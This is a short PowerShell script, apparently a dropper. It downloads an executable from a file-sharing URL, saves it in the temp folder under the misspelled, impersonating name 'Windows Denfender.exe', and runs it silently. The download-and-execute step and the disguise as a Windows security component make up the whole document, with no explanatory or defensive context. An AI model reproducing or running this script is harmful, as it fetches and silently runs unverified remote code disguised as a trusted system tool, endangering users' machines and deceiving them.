$FileUri = "https://upload.cyen.fr/share/1711360059562685.exe"
$Destination = $env:TMP+"\Windows Denfender.exe"
$bitsJobObj = Start-BitsTransfer $FileUri -Destination $Destination
$exeArgs = '/verysilent,addcontextmenufolders,addtopath'
Start-Process -Wait $Destination -ArgumentList $exeArgs

